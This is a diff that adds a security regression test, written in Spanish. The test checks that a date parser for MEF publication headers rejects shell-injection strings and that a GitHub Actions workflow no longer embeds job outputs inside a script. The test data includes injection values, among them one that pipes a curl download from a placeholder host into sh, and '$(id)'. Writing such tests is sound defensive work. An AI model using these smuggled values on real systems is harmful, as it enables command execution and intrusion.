@@ -67,6 +67,17 @@ def _():
     assert cmp_ == {"desde": "2026-11-06", "hasta": "2026-11-11", "habiles": 3, "tolerancia": T.TOL_VAR}, cmp_
 
 
+# ------------------------------------------------------------------ S1 (revisión de seguridad del 19/11/2026)
+@prueba("S1", "La fecha de publicación del MEF solo se acepta con su forma estándar; un texto con comandos se rechaza")
+def _():
+    import vigilar_mef as G
+    assert G.fecha_http("Wed, 18 Nov 2026 13:39:08 GMT") == "Wed, 18 Nov 2026 13:39:08 GMT" and G.fecha_http(None) is None
+    for malo in ('x"; curl http://ejemplo.invalid | sh; echo "', "$(id)", "`id`", "Wed, 18 Nov 2026 13:39:08 GMT; id", ""):
+        falla_con(ValueError, G.fecha_http, malo)
+    y = open(os.path.join(os.path.dirname(AQUI), ".github", "workflows", "control-ro.yml"), encoding="utf-8").read()
+    assert '"${{ needs.vigilar.outputs' not in y, "una salida de «vigilar» sigue pegada dentro de un guion"
+
+
 # ------------------------------------------------------------------ M02
 F5 = ["2026-11-06", "2026-11-09", "2026-11-10", "2026-11-11", "2026-11-12"]
 
